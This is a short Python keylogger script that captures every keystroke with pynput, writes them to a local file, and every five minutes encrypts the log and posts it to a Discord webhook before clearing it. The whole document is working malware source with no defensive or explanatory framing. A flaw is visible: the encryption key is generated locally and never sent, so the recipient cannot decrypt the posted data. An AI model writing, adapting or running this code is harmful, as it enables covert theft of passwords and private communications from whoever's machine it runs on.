import os
import time
import requests
import shutil
import sys
from pynput import keyboard
import winshell
from cryptography.fernet import Fernet
import base64

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
lols = "keylog.txt"

encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)

def send_to_discord(encrypted_content):
    encrypted_base64 = base64.b64encode(encrypted_content).decode('utf-8')
    
    data = {
        "content": encrypted_base64
    }
    requests.post(discord, json=data)

def on_press(key):
    try:
        with open(lols, "a") as wqe:
            wqe.write(f"{key.char}\n")
    except AttributeError:
        with open(lols, "a") as wqe:
            wqe.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    while True:
        time.sleep(300)

        if os.path.exists(lols):
            with open(lols, 'r') as f:
                log_content = f.read()

            encrypted_content = cipher_suite.encrypt(log_content.encode())

            send_to_discord(encrypted_content)

            with open(lols, "w") as a:
                a.write("")

listener.join()
